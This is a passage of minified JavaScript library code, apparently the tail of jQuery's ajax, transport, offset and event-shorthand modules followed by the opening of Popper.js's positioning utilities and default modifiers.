ajaxPrefilter: Je(Me), ajaxTransport: Je(ze), ajax: function (t, e) { "object" == typeof t && (e = t, t = void 0), e = e || {}; var c, I, u, n, h, i, d, C, o, a, A = F.ajaxSetup({}, e), p = A.context || A, m = A.context && (p.nodeType || p.jquery) ? F(p) : F.event, f = F.Deferred(), b = F.Callbacks("once memory"), B = A.statusCode || {}, s = {}, r = {}, g = "canceled", y = { readyState: 0, getResponseHeader: function (t) { var e; if (d) { if (!n) for (n = {}; e = _e.exec(u);)n[e[1].toLowerCase() + " "] = (n[e[1].toLowerCase() + " "] || []).concat(e[2]); e = n[t.toLowerCase() + " "] } return null == e ? null : e.join(", ") }, getAllResponseHeaders: function () { return d ? u : null }, setRequestHeader: function (t, e) { return null == d && (t = r[t.toLowerCase()] = r[t.toLowerCase()] || t, s[t] = e), this }, overrideMimeType: function (t) { return null == d && (A.mimeType = t), this }, statusCode: function (t) { var e; if (t) if (d) y.always(t[y.status]); else for (e in t) B[e] = [B[e], t[e]]; return this }, abort: function (t) { var e = t || g; return c && c.abort(e), l(0, e), this } }; if (f.promise(y), A.url = ((t || A.url || Ze.href) + "").replace(Le, Ze.protocol + "//"), A.type = e.method || e.type || A.method || A.type, A.dataTypes = (A.dataType || "*").toLowerCase().match(N) || [""], null == A.crossDomain) { i = x.createElement("a"); try { i.href = A.url, i.href, A.crossDomain = Ke.protocol + "//" + Ke.host != i.protocol + "//" + i.host } catch (t) { A.crossDomain = !0 } } if (A.data && A.processData && "string" != typeof A.data && (A.data = F.param(A.data, A.traditional)), je(Me, A, e, y), d) return y; for (o in (C = F.event && A.global) && 0 == F.active++ && F.event.trigger("ajaxStart"), A.type = A.type.toUpperCase(), A.hasContent = !Ve.test(A.type), I = A.url.replace(Ye, ""), A.hasContent ? A.data && A.processData && 0 === (A.contentType || "").indexOf("application/x-www-form-urlencoded") && (A.data = A.data.replace(Re, "+")) : (a = A.url.slice(I.length), A.data && (A.processData || "string" == typeof A.data) && (I += (We.test(I) ? "&" : "?") + A.data, delete A.data), !1 === A.cache && (I = I.replace(Oe, "$1"), a = (We.test(I) ? "&" : "?") + "_=" + Ue++ + a), A.url = I + a), A.ifModified && (F.lastModified[I] && y.setRequestHeader("If-Modified-Since", F.lastModified[I]), F.etag[I] && y.setRequestHeader("If-None-Match", F.etag[I])), (A.data && A.hasContent && !1 !== A.contentType || e.contentType) && y.setRequestHeader("Content-Type", A.contentType), y.setRequestHeader("Accept", A.dataTypes[0] && A.accepts[A.dataTypes[0]] ? A.accepts[A.dataTypes[0]] + ("*" !== A.dataTypes[0] ? ", " + Pe + "; q=0.01" : "") : A.accepts["*"]), A.headers) y.setRequestHeader(o, A.headers[o]); if (A.beforeSend && (!1 === A.beforeSend.call(p, y, A) || d)) return y.abort(); if (g = "abort", b.add(A.complete), y.done(A.success), y.fail(A.error), c = je(ze, A, e, y)) { if (y.readyState = 1, C && m.trigger("ajaxSend", [y, A]), d) return y; A.async && 0 < A.timeout && (h = v.setTimeout(function () { y.abort("timeout") }, A.timeout)); try { d = !1, c.send(s, l) } catch (t) { if (d) throw t; l(-1, t) } } else l(-1, "No Transport"); function l(t, e, n, i) { var o, a, s, r, g, l = e; d || (d = !0, h && v.clearTimeout(h), c = void 0, u = i || "", y.readyState = 0 < t ? 4 : 0, o = 200 <= t && t < 300 || 304 === t, n && (r = function (t, e, n) { for (var i, o, a, s, r = t.contents, g = t.dataTypes; "*" === g[0];)g.shift(), void 0 === i && (i = t.mimeType || e.getResponseHeader("Content-Type")); if (i) for (o in r) if (r[o] && r[o].test(i)) { g.unshift(o); break } if (g[0] in n) a = g[0]; else { for (o in n) { if (!g[0] || t.converters[o + " " + g[0]]) { a = o; break } s = s || o } a = a || s } if (a) return a !== g[0] && g.unshift(a), n[a] }(A, y, n)), r = function (t, e, n, i) { var o, a, s, r, g, l = {}, c = t.dataTypes.slice(); if (c[1]) for (s in t.converters) l[s.toLowerCase()] = t.converters[s]; for (a = c.shift(); a;)if (t.responseFields[a] && (n[t.responseFields[a]] = e), !g && i && t.dataFilter && (e = t.dataFilter(e, t.dataType)), g = a, a = c.shift()) if ("*" === a) a = g; else if ("*" !== g && g !== a) { if (!(s = l[g + " " + a] || l["* " + a])) for (o in l) if ((r = o.split(" "))[1] === a && (s = l[g + " " + r[0]] || l["* " + r[0]])) { !0 === s ? s = l[o] : !0 !== l[o] && (a = r[0], c.unshift(r[1])); break } if (!0 !== s) if (s && t.throws) e = s(e); else try { e = s(e) } catch (t) { return { state: "parsererror", error: s ? t : "No conversion from " + g + " to " + a } } } return { state: "success", data: e } }(A, r, y, o), o ? (A.ifModified && ((g = y.getResponseHeader("Last-Modified")) && (F.lastModified[I] = g), (g = y.getResponseHeader("etag")) && (F.etag[I] = g)), 204 === t || "HEAD" === A.type ? l = "nocontent" : 304 === t ? l = "notmodified" : (l = r.state, a = r.data, o = !(s = r.error))) : (s = l, !t && l || (l = "error", t < 0 && (t = 0))), y.status = t, y.statusText = (e || l) + "", o ? f.resolveWith(p, [a, l, y]) : f.rejectWith(p, [y, l, s]), y.statusCode(B), B = void 0, C && m.trigger(o ? "ajaxSuccess" : "ajaxError", [y, A, o ? a : s]), b.fireWith(p, [y, l]), C && (m.trigger("ajaxComplete", [y, A]), --F.active || F.event.trigger("ajaxStop"))) } return y }, getJSON: function (t, e, n) { return F.get(t, e, n, "json") }, getScript: function (t, e) { return F.get(t, void 0, e, "script") } }), F.each(["get", "post"], function (t, o) { F[o] = function (t, e, n, i) { return f(e) && (i = i || n, n = e, e = void 0), F.ajax(F.extend({ url: t, type: o, dataType: i, data: e, success: n }, F.isPlainObject(t) && t)) } }), F._evalUrl = function (t, e) { return F.ajax({ url: t, type: "GET", dataType: "script", cache: !0, async: !1, global: !1, converters: { "text script": function () { } }, dataFilter: function (t) { F.globalEval(t, e) } }) }, F.fn.extend({ wrapAll: function (t) { var e; return this[0] && (f(t) && (t = t.call(this[0])), e = F(t, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && e.insertBefore(this[0]), e.map(function () { for (var t = this; t.firstElementChild;)t = t.firstElementChild; return t }).append(this)), this }, wrapInner: function (n) { return f(n) ? this.each(function (t) { F(this).wrapInner(n.call(this, t)) }) : this.each(function () { var t = F(this), e = t.contents(); e.length ? e.wrapAll(n) : t.append(n) }) }, wrap: function (e) { var n = f(e); return this.each(function (t) { F(this).wrapAll(n ? e.call(this, t) : e) }) }, unwrap: function (t) { return this.parent(t).not("body").each(function () { F(this).replaceWith(this.childNodes) }), this } }), F.expr.pseudos.hidden = function (t) { return !F.expr.pseudos.visible(t) }, F.expr.pseudos.visible = function (t) { return !!(t.offsetWidth || t.offsetHeight || t.getClientRects().length) }, F.ajaxSettings.xhr = function () { try { return new v.XMLHttpRequest } catch (t) { } }; var qe = { 0: 200, 1223: 204 }, tn = F.ajaxSettings.xhr(); m.cors = !!tn && "withCredentials" in tn, m.ajax = tn = !!tn, F.ajaxTransport(function (o) { var a, s; if (m.cors || tn && !o.crossDomain) return { send: function (t, e) { var n, i = o.xhr(); if (i.open(o.type, o.url, o.async, o.username, o.password), o.xhrFields) for (n in o.xhrFields) i[n] = o.xhrFields[n]; for (n in o.mimeType && i.overrideMimeType && i.overrideMimeType(o.mimeType), o.crossDomain || t["X-Requested-With"] || (t["X-Requested-With"] = "XMLHttpRequest"), t) i.setRequestHeader(n, t[n]); a = function (t) { return function () { a && (a = s = i.onload = i.onerror = i.onabort = i.ontimeout = i.onreadystatechange = null, "abort" === t ? i.abort() : "error" === t ? "number" != typeof i.status ? e(0, "error") : e(i.status, i.statusText) : e(qe[i.status] || i.status, i.statusText, "text" !== (i.responseType || "text") || "string" != typeof i.responseText ? { binary: i.response } : { text: i.responseText }, i.getAllResponseHeaders())) } }, i.onload = a(), s = i.onerror = i.ontimeout = a("error"), void 0 !== i.onabort ? i.onabort = s : i.onreadystatechange = function () { 4 === i.readyState && v.setTimeout(function () { a && s() }) }, a = a("abort"); try { i.send(o.hasContent && o.data || null) } catch (t) { if (a) throw t } }, abort: function () { a && a() } } }), F.ajaxPrefilter(function (t) { t.crossDomain && (t.contents.script = !1) }), F.ajaxSetup({ accepts: { script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript" }, contents: { script: /\b(?:java|ecma)script\b/ }, converters: { "text script": function (t) { return F.globalEval(t), t } } }), F.ajaxPrefilter("script", function (t) { void 0 === t.cache && (t.cache = !1), t.crossDomain && (t.type = "GET") }), F.ajaxTransport("script", function (n) { var i, o; if (n.crossDomain || n.scriptAttrs) return { send: function (t, e) { i = F("<script>").attr(n.scriptAttrs || {}).prop({ charset: n.scriptCharset, src: n.url }).on("load error", o = function (t) { i.remove(), o = null, t && e("error" === t.type ? 404 : 200, t.type) }), x.head.appendChild(i[0]) }, abort: function () { o && o() } } }); var en, nn = [], on = /(=)\?(?=&|$)|\?\?/; F.ajaxSetup({ jsonp: "callback", jsonpCallback: function () { var t = nn.pop() || F.expando + "_" + Ue++; return this[t] = !0, t } }), F.ajaxPrefilter("json jsonp", function (t, e, n) { var i, o, a, s = !1 !== t.jsonp && (on.test(t.url) ? "url" : "string" == typeof t.data && 0 === (t.contentType || "").indexOf("application/x-www-form-urlencoded") && on.test(t.data) && "data"); if (s || "jsonp" === t.dataTypes[0]) return i = t.jsonpCallback = f(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback, s ? t[s] = t[s].replace(on, "$1" + i) : !1 !== t.jsonp && (t.url += (We.test(t.url) ? "&" : "?") + t.jsonp + "=" + i), t.converters["script json"] = function () { return a || F.error(i + " was not called"), a[0] }, t.dataTypes[0] = "json", o = v[i], v[i] = function () { a = arguments }, n.always(function () { void 0 === o ? F(v).removeProp(i) : v[i] = o, t[i] && (t.jsonpCallback = e.jsonpCallback, nn.push(i)), a && f(o) && o(a[0]), a = o = void 0 }), "script" }), m.createHTMLDocument = ((en = x.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === en.childNodes.length), F.parseHTML = function (t, e, n) { return "string" != typeof t ? [] : ("boolean" == typeof e && (n = e, e = !1), e || (m.createHTMLDocument ? ((i = (e = x.implementation.createHTMLDocument("")).createElement("base")).href = x.location.href, e.head.appendChild(i)) : e = x), a = !n && [], (o = X.exec(t)) ? [e.createElement(o[1])] : (o = Bt([t], e, a), a && a.length && F(a).remove(), F.merge([], o.childNodes))); var i, o, a }, F.fn.load = function (t, e, n) { var i, o, a, s = this, r = t.indexOf(" "); return -1 < r && (i = Ge(t.slice(r)), t = t.slice(0, r)), f(e) ? (n = e, e = void 0) : e && "object" == typeof e && (o = "POST"), 0 < s.length && F.ajax({ url: t, type: o || "GET", dataType: "html", data: e }).done(function (t) { a = arguments, s.html(i ? F("<div>").append(F.parseHTML(t)).find(i) : t) }).always(n && function (t, e) { s.each(function () { n.apply(this, a || [t.responseText, e, t]) }) }), this }, F.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (t, e) { F.fn[e] = function (t) { return this.on(e, t) } }), F.expr.pseudos.animated = function (e) { return F.grep(F.timers, function (t) { return e === t.elem }).length }, F.offset = { setOffset: function (t, e, n) { var i, o, a, s, r, g, l = F.css(t, "position"), c = F(t), I = {}; "static" === l && (t.style.position = "relative"), r = c.offset(), a = F.css(t, "top"), g = F.css(t, "left"), o = ("absolute" === l || "fixed" === l) && -1 < (a + g).indexOf("auto") ? (s = (i = c.position()).top, i.left) : (s = parseFloat(a) || 0, parseFloat(g) || 0), f(e) && (e = e.call(t, n, F.extend({}, r))), null != e.top && (I.top = e.top - r.top + s), null != e.left && (I.left = e.left - r.left + o), "using" in e ? e.using.call(t, I) : c.css(I) } }, F.fn.extend({ offset: function (e) { if (arguments.length) return void 0 === e ? this : this.each(function (t) { F.offset.setOffset(this, e, t) }); var t, n, i = this[0]; return i ? i.getClientRects().length ? (t = i.getBoundingClientRect(), n = i.ownerDocument.defaultView, { top: t.top + n.pageYOffset, left: t.left + n.pageXOffset }) : { top: 0, left: 0 } : void 0 }, position: function () { if (this[0]) { var t, e, n, i = this[0], o = { top: 0, left: 0 }; if ("fixed" === F.css(i, "position")) e = i.getBoundingClientRect(); else { for (e = this.offset(), n = i.ownerDocument, t = i.offsetParent || n.documentElement; t && (t === n.body || t === n.documentElement) && "static" === F.css(t, "position");)t = t.parentNode; t && t !== i && 1 === t.nodeType && ((o = F(t).offset()).top += F.css(t, "borderTopWidth", !0), o.left += F.css(t, "borderLeftWidth", !0)) } return { top: e.top - o.top - F.css(i, "marginTop", !0), left: e.left - o.left - F.css(i, "marginLeft", !0) } } }, offsetParent: function () { return this.map(function () { for (var t = this.offsetParent; t && "static" === F.css(t, "position");)t = t.offsetParent; return t || ot }) } }), F.each({ scrollLeft: "pageXOffset", scrollTop: "pageYOffset" }, function (e, o) { var a = "pageYOffset" === o; F.fn[e] = function (t) { return _(this, function (t, e, n) { var i; return C(t) ? i = t : 9 === t.nodeType && (i = t.defaultView), void 0 === n ? i ? i[o] : t[e] : void (i ? i.scrollTo(a ? i.pageXOffset : n, a ? n : i.pageYOffset) : t[e] = n) }, e, t, arguments.length) } }), F.each(["top", "left"], function (t, n) { F.cssHooks[n] = qt(m.pixelPosition, function (t, e) { if (e) return e = $t(t, n), zt.test(e) ? F(t).position()[n] + "px" : e }) }), F.each({ Height: "height", Width: "width" }, function (s, r) { F.each({ padding: "inner" + s, content: r, "": "outer" + s }, function (i, a) { F.fn[a] = function (t, e) { var n = arguments.length && (i || "boolean" != typeof t), o = i || (!0 === t || !0 === e ? "margin" : "border"); return _(this, function (t, e, n) { var i; return C(t) ? 0 === a.indexOf("outer") ? t["inner" + s] : t.document.documentElement["client" + s] : 9 === t.nodeType ? (i = t.documentElement, Math.max(t.body["scroll" + s], i["scroll" + s], t.body["offset" + s], i["offset" + s], i["client" + s])) : void 0 === n ? F.css(t, e, o) : F.style(t, e, n, o) }, r, n ? t : void 0, n) } }) }), F.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function (t, n) { F.fn[n] = function (t, e) { return 0 < arguments.length ? this.on(n, null, t, e) : this.trigger(n) } }), F.fn.extend({ hover: function (t, e) { return this.mouseenter(t).mouseleave(e || t) } }), F.fn.extend({ bind: function (t, e, n) { return this.on(t, null, e, n) }, unbind: function (t, e) { return this.off(t, null, e) }, delegate: function (t, e, n, i) { return this.on(e, t, n, i) }, undelegate: function (t, e, n) { return 1 === arguments.length ? this.off(t, "**") : this.off(e, t || "**", n) } }), F.proxy = function (t, e) { var n, i, o; if ("string" == typeof e && (n = t[e], e = t, t = n), f(t)) return i = r.call(arguments, 2), (o = function () { return t.apply(e || this, i.concat(r.call(arguments))) }).guid = t.guid = t.guid || F.guid++, o }, F.holdReady = function (t) { t ? F.readyWait++ : F.ready(!0) }, F.isArray = Array.isArray, F.parseJSON = JSON.parse, F.nodeName = w, F.isFunction = f, F.isWindow = C, F.camelCase = z, F.type = B, F.now = Date.now, F.isNumeric = function (t) { var e = F.type(t); return ("number" === e || "string" === e) && !isNaN(t - parseFloat(t)) }, "function" == typeof define && define.amd && define("jquery", [], function () { return F }); var an = v.jQuery, sn = v.$; return F.noConflict = function (t) { return v.$ === F && (v.$ = sn), t && v.jQuery === F && (v.jQuery = an), F }, t || (v.jQuery = v.$ = F), F }), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : t.Popper = e() }(this, function () { "use strict"; for (var t = "undefined" != typeof window && "undefined" != typeof document, e = ["Edge", "Trident", "Firefox"], n = 0, i = 0; i < e.length; i += 1)if (t && 0 <= navigator.userAgent.indexOf(e[i])) { n = 1; break } var a = t && window.Promise ? function (t) { var e = !1; return function () { e || (e = !0, window.Promise.resolve().then(function () { e = !1, t() })) } } : function (t) { var e = !1; return function () { e || (e = !0, setTimeout(function () { e = !1, t() }, n)) } }; function s(t) { return t && "[object Function]" === {}.toString.call(t) } function b(t, e) { if (1 !== t.nodeType) return []; var n = t.ownerDocument.defaultView.getComputedStyle(t, null); return e ? n[e] : n } function d(t) { return "HTML" === t.nodeName ? t : t.parentNode || t.host } function C(t) { if (!t) return document.body; switch (t.nodeName) { case "HTML": case "BODY": return t.ownerDocument.body; case "#document": return t.body }var e = b(t), n = e.overflow, i = e.overflowX, o = e.overflowY; return /(auto|scroll|overlay)/.test(n + o + i) ? t : C(d(t)) } var o = t && !(!window.MSInputMethodContext || !document.documentMode), r = t && /MSIE 10/.test(navigator.userAgent); function A(t) { return 11 === t ? o : 10 !== t && o || r } function f(t) { if (!t) return document.documentElement; for (var e = A(10) ? document.body : null, n = t.offsetParent || null; n === e && t.nextElementSibling;)n = (t = t.nextElementSibling).offsetParent; var i = n && n.nodeName; return i && "BODY" !== i && "HTML" !== i ? -1 !== ["TH", "TD", "TABLE"].indexOf(n.nodeName) && "static" === b(n, "position") ? f(n) : n : t ? t.ownerDocument.documentElement : document.documentElement } function c(t) { return null !== t.parentNode ? c(t.parentNode) : t } function p(t, e) { if (!(t && t.nodeType && e && e.nodeType)) return document.documentElement; var n = t.compareDocumentPosition(e) & Node.DOCUMENT_POSITION_FOLLOWING, i = n ? t : e, o = n ? e : t, a = document.createRange(); a.setStart(i, 0), a.setEnd(o, 0); var s, r, g = a.commonAncestorContainer; if (t !== g && e !== g || i.contains(o)) return "BODY" === (r = (s = g).nodeName) || "HTML" !== r && f(s.firstElementChild) !== s ? f(g) : g; var l = c(t); return l.host ? p(l.host, e) : p(t, c(e).host) } function m(t, e) { var n = "top" === (1 < arguments.length && void 0 !== e ? e : "top") ? "scrollTop" : "scrollLeft", i = t.nodeName; if ("BODY" !== i && "HTML" !== i) return t[n]; var o = t.ownerDocument.documentElement; return (t.ownerDocument.scrollingElement || o)[n] } function I(t, e) { var n = "x" === e ? "Left" : "Top", i = "Left" == n ? "Right" : "Bottom"; return parseFloat(t["border" + n + "Width"], 10) + parseFloat(t["border" + i + "Width"], 10) } function g(t, e, n, i) { return Math.max(e["offset" + t], e["scroll" + t], n["client" + t], n["offset" + t], n["scroll" + t], A(10) ? parseInt(n["offset" + t]) + parseInt(i["margin" + ("Height" === t ? "Top" : "Left")]) + parseInt(i["margin" + ("Height" === t ? "Bottom" : "Right")]) : 0) } function B(t) { var e = t.body, n = t.documentElement, i = A(10) && getComputedStyle(n); return { height: g("Height", e, n, i), width: g("Width", e, n, i) } } var l = function (t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") }, u = function (t, e, n) { return e && h(t.prototype, e), n && h(t, n), t }; function h(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } function y(t, e, n) { return e in t ? Object.defineProperty(t, e, { value: n, enumerable: !0, configurable: !0, writable: !0 }) : t[e] = n, t } var v = Object.assign || function (t) { for (var e = 1; e < arguments.length; e++) { var n = arguments[e]; for (var i in n) Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]) } return t }; function x(t) { return v({}, t, { right: t.left + t.width, bottom: t.top + t.height }) } function F(t) { var e, n, i = {}; try { A(10) ? (i = t.getBoundingClientRect(), e = m(t, "top"), n = m(t, "left"), i.top += e, i.left += n, i.bottom += e, i.right += n) : i = t.getBoundingClientRect() } catch (t) { } var o, a = { left: i.left, top: i.top, width: i.right - i.left, height: i.bottom - i.top }, s = "HTML" === t.nodeName ? B(t.ownerDocument) : {}, r = s.width || t.clientWidth || a.right - a.left, g = s.height || t.clientHeight || a.bottom - a.top, l = t.offsetWidth - r, c = t.offsetHeight - g; return (l || c) && (l -= I(o = b(t), "x"), c -= I(o, "y"), a.width -= l, a.height -= c), x(a) } function Q(t, e, n) { var i = 2 < arguments.length && void 0 !== n && n, o = A(10), a = "HTML" === e.nodeName, s = F(t), r = F(e), g = C(t), l = b(e), c = parseFloat(l.borderTopWidth, 10), I = parseFloat(l.borderLeftWidth, 10); i && a && (r.top = Math.max(r.top, 0), r.left = Math.max(r.left, 0)); var u, h, d = x({ top: s.top - r.top - c, left: s.left - r.left - I, width: s.width, height: s.height }); return d.marginTop = 0, d.marginLeft = 0, !o && a && (u = parseFloat(l.marginTop, 10), h = parseFloat(l.marginLeft, 10), d.top -= c - u, d.bottom -= c - u, d.left -= I - h, d.right -= I - h, d.marginTop = u, d.marginLeft = h), (o && !i ? e.contains(g) : e === g && "BODY" !== g.nodeName) && (d = function (t, e, n) { var i = 2 < arguments.length && void 0 !== n && n, o = m(e, "top"), a = m(e, "left"), s = i ? -1 : 1; return t.top += o * s, t.bottom += o * s, t.left += a * s, t.right += a * s, t }(d, e)), d } function G(t) { if (!t || !t.parentElement || A()) return document.documentElement; for (var e = t.parentElement; e && "none" === b(e, "transform");)e = e.parentElement; return e || document.documentElement } function w(t, e, n, i, o) { var a, s, r, g, l, c = 4 < arguments.length && void 0 !== o && o, I = { top: 0, left: 0 }, u = c ? G(t) : p(t, e); "viewport" === i ? I = function (t, e) { var n = 1 < arguments.length && void 0 !== e && e, i = t.ownerDocument.documentElement, o = Q(t, i), a = Math.max(i.clientWidth, window.innerWidth || 0), s = Math.max(i.clientHeight, window.innerHeight || 0), r = n ? 0 : m(i), g = n ? 0 : m(i, "left"); return x({ top: r - o.top + o.marginTop, left: g - o.left + o.marginLeft, width: a, height: s }) }(u, c) : (a = void 0, "scrollParent" === i ? "BODY" === (a = C(d(e))).nodeName && (a = t.ownerDocument.documentElement) : a = "window" === i ? t.ownerDocument.documentElement : i, s = Q(a, u, c), "HTML" !== a.nodeName || function t(e) { var n = e.nodeName; if ("BODY" === n || "HTML" === n) return !1; if ("fixed" === b(e, "position")) return !0; var i = d(e); return !!i && t(i) }(u) ? I = s : (g = (r = B(t.ownerDocument)).height, l = r.width, I.top += s.top - s.marginTop, I.bottom = g + s.top, I.left += s.left - s.marginLeft, I.right = l + s.left)); var h = "number" == typeof (n = n || 0); return I.left += h ? n : n.left || 0, I.top += h ? n : n.top || 0, I.right -= h ? n : n.right || 0, I.bottom -= h ? n : n.bottom || 0, I } function X(t, e, i, n, o, a) { var s = 5 < arguments.length && void 0 !== a ? a : 0; if (-1 === t.indexOf("auto")) return t; var r = w(i, n, s, o), g = { top: { width: r.width, height: e.top - r.top }, right: { width: r.right - e.right, height: r.height }, bottom: { width: r.width, height: r.bottom - e.bottom }, left: { width: e.left - r.left, height: r.height } }, l = Object.keys(g).map(function (t) { return v({ key: t }, g[t], { area: (e = g[t]).width * e.height }); var e }).sort(function (t, e) { return e.area - t.area }), c = l.filter(function (t) { var e = t.width, n = t.height; return e >= i.clientWidth && n >= i.clientHeight }), I = 0 < c.length ? c[0].key : l[0].key, u = t.split("-")[1]; return I + (u ? "-" + u : "") } function S(t, e, n, i) { var o = 3 < arguments.length && void 0 !== i ? i : null; return Q(n, o ? G(e) : p(e, n), o) } function k(t) { var e = t.ownerDocument.defaultView.getComputedStyle(t), n = parseFloat(e.marginTop || 0) + parseFloat(e.marginBottom || 0), i = parseFloat(e.marginLeft || 0) + parseFloat(e.marginRight || 0); return { width: t.offsetWidth + i, height: t.offsetHeight + n } } function D(t) { var e = { left: "right", right: "left", bottom: "top", top: "bottom" }; return t.replace(/left|right|bottom|top/g, function (t) { return e[t] }) } function Z(t, e, n) { n = n.split("-")[0]; var i = k(t), o = { width: i.width, height: i.height }, a = -1 !== ["right", "left"].indexOf(n), s = a ? "top" : "left", r = a ? "left" : "top", g = a ? "height" : "width", l = a ? "width" : "height"; return o[s] = e[s] + e[g] / 2 - i[g] / 2, o[r] = n === r ? e[r] - i[l] : e[D(r)], o } function U(t, e) { return Array.prototype.find ? t.find(e) : t.filter(e)[0] } function W(t, n, e) { return (void 0 === e ? t : t.slice(0, function (t, e, n) { if (Array.prototype.findIndex) return t.findIndex(function (t) { return t[e] === n }); var i = U(t, function (t) { return t[e] === n }); return t.indexOf(i) }(t, "name", e))).forEach(function (t) { t.function && console.warn("`modifier.function` is deprecated, use `modifier.fn`!"); var e = t.function || t.fn; t.enabled && s(e) && (n.offsets.popper = x(n.offsets.popper), n.offsets.reference = x(n.offsets.reference), n = e(n, t)) }), n } function N(t, n) { return t.some(function (t) { var e = t.name; return t.enabled && e === n }) } function T(t) { for (var e = [!1, "ms", "Webkit", "Moz", "O"], n = t.charAt(0).toUpperCase() + t.slice(1), i = 0; i < e.length; i++) { var o = e[i], a = o ? "" + o + n : t; if (void 0 !== document.body.style[a]) return a } return null } function H(t) { var e = t.ownerDocument; return e ? e.defaultView : window } function E(t, e, n, i) { n.updateBound = i, H(t).addEventListener("resize", n.updateBound, { passive: !0 }); var o = C(t); return function t(e, n, i, o) { var a = "BODY" === e.nodeName, s = a ? e.ownerDocument.defaultView : e; s.addEventListener(n, i, { passive: !0 }), a || t(C(s.parentNode), n, i, o), o.push(s) }(o, "scroll", n.updateBound, n.scrollParents), n.scrollElement = o, n.eventsEnabled = !0, n } function R() { var t, e; this.state.eventsEnabled && (cancelAnimationFrame(this.scheduleUpdate), this.state = (t = this.reference, e = this.state, H(t).removeEventListener("resize", e.updateBound), e.scrollParents.forEach(function (t) { t.removeEventListener("scroll", e.updateBound) }), e.updateBound = null, e.scrollParents = [], e.scrollElement = null, e.eventsEnabled = !1, e)) } function Y(t) { return "" !== t && !isNaN(parseFloat(t)) && isFinite(t) } function O(n, i) { Object.keys(i).forEach(function (t) { var e = ""; -1 !== ["width", "height", "top", "right", "bottom", "left"].indexOf(t) && Y(i[t]) && (e = "px"), n.style[t] = i[t] + e }) } function _(t, e) { function n(t) { return t } var i = t.offsets, o = i.popper, a = i.reference, s = Math.round, r = Math.floor, g = s(a.width), l = s(o.width), c = -1 !== ["left", "right"].indexOf(t.placement), I = -1 !== t.placement.indexOf("-"), u = e ? c || I || g % 2 == l % 2 ? s : r : n, h = e ? s : n; return { left: u(g % 2 == 1 && l % 2 == 1 && !I && e ? o.left - 1 : o.left), top: h(o.top), bottom: h(o.bottom), right: u(o.right) } } var V = t && /Firefox/i.test(navigator.userAgent); function L(t, e, n) { var i, o, a = U(t, function (t) { return t.name === e }), s = !!a && t.some(function (t) { return t.name === n && t.enabled && t.order < a.order }); return s || (i = "`" + e + "`", o = "`" + n + "`", console.warn(o + " modifier is required by " + i + " modifier in order to work, be sure to include it before " + i + "!")), s } var M = ["auto-start", "auto", "auto-end", "top-start", "top", "top-end", "right-start", "right", "right-end", "bottom-end", "bottom", "bottom-start", "left-end", "left", "left-start"], z = M.slice(3); function P(t, e) { var n = 1 < arguments.length && void 0 !== e && e, i = z.indexOf(t), o = z.slice(i + 1).concat(z.slice(0, i)); return n ? o.reverse() : o } var K = "flip", J = "clockwise", j = "counterclockwise"; function $(t, o, a, e) { var s = [0, 0], r = -1 !== ["right", "left"].indexOf(e), n = t.split(/(\+|\-)/).map(function (t) { return t.trim() }), i = n.indexOf(U(n, function (t) { return -1 !== t.search(/,|\s/) })); n[i] && -1 === n[i].indexOf(",") && console.warn("Offsets separated by white space(s) are deprecated, use a comma (,) instead."); var g = /\s*,\s*|\s+/; return (-1 !== i ? [n.slice(0, i).concat([n[i].split(g)[0]]), [n[i].split(g)[1]].concat(n.slice(i + 1))] : [n]).map(function (t, e) { var n = (1 === e ? !r : r) ? "height" : "width", i = !1; return t.reduce(function (t, e) { return "" === t[t.length - 1] && -1 !== ["+", "-"].indexOf(e) ? (t[t.length - 1] = e, i = !0, t) : i ? (t[t.length - 1] += e, i = !1, t) : t.concat(e) }, []).map(function (t) { return function (t, e, n, i) { var o = t.match(/((?:\-|\+)?\d*\.?\d*)(.*)/), a = +o[1], s = o[2]; if (!a) return t; if (0 !== s.indexOf("%")) return "vh" !== s && "vw" !== s ? a : ("vh" === s ? Math.max(document.documentElement.clientHeight, window.innerHeight || 0) : Math.max(document.documentElement.clientWidth, window.innerWidth || 0)) / 100 * a; var r = void 0; switch (s) { case "%p": r = n; break; case "%": case "%r": default: r = i }return x(r)[e] / 100 * a }(t, n, o, a) }) }).forEach(function (n, i) { n.forEach(function (t, e) { Y(t) && (s[i] += t * ("-" === n[e - 1] ? -1 : 1)) }) }), s } var q = { placement: "bottom", positionFixed: !1, eventsEnabled: !0, removeOnDestroy: !1, onCreate: function () { }, onUpdate: function () { }, modifiers: { shift: { order: 100, enabled: !0, fn: function (t) { var e, n, i, o, a, s, r, g = t.placement, l = g.split("-")[0], c = g.split("-")[1]; return c && (n = (e = t.offsets).reference, i = e.popper, s = (o = -1 !== ["bottom", "top"].indexOf(l)) ? "width" : "height", r = { start: y({}, a = o ? "left" : "top", n[a]), end: y({}, a, n[a] + n[s] - i[s]) }, t.offsets.popper = v({}, i, r[c])), t } }, offset: { order: 200, enabled: !0, fn: function (t, e) { var n = e.offset, i = t.placement, o = t.offsets, a = o.popper, s = o.reference, r = i.split("-")[0], g = void 0, g = Y(+n) ? [+n, 0] : $(n, a, s, r); return "left" === r ? (a.top += g[0], a.left -= g[1]) : "right" === r ? (a.top += g[0], a.left += g[1]) : "top" === r ? (a.left += g[0], a.top -= g[1]) : "bottom" === r && (a.left += g[0], a.top += g[1]), t.popper = a, t }, offset: 0 }, preventOverflow: { order: 300, enabled: !0, fn: function (t, i) { var e = i.boundariesElement || f(t.instance.popper); t.instance.reference === e && (e = f(e)); var n = T("transform"), o = t.instance.popper.style, a = o.top, s = o.left, r = o[n]; o.top = "", o.left = "", o[n] = ""; var g = w(t.instance.popper, t.instance.reference, i.padding, e, t.positionFixed); o.top = a, o.left = s, o[n] = r, i.boundaries = g; var l = i.priority, c = t.offsets.popper, I = { primary: function (t) { var e = c[t]; return c[t] < g[t] && !i.escapeWithReference && (e = 